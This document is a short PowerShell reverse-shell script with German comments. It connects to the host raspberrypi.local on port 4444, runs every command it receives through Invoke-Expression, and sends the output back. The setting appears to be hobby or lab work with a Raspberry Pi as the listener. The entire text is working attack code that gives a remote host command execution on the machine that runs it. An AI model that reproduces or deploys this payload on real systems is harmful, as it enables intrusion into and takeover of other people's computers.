$sm=(New-Object Net.Sockets.TCPClient("raspberrypi.local",4444)).GetStream();

[byte[]]$bt=0..65535|%{0};
# bytearray (2 hoch 16 Nullen) filled with zeroes
#buffer where tcp stream is stored

while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){ # read -> returns number of bytes read or 0 if closed
  Try{;
    $d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);
    #$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));
    $stdout = iex $d 2>&1
    $stdout = [string[]] $stdout
    $st = ""
    foreach($line in $stdout){
    $st = $st+$line+"\n"
    }
    echo $st
    # stdout ist string array -> versuchen leerzeilenzeichen zwischen array dinger zu machen
    $sm.Write($st,0,$st.Length)
  }Catch{

  }
}
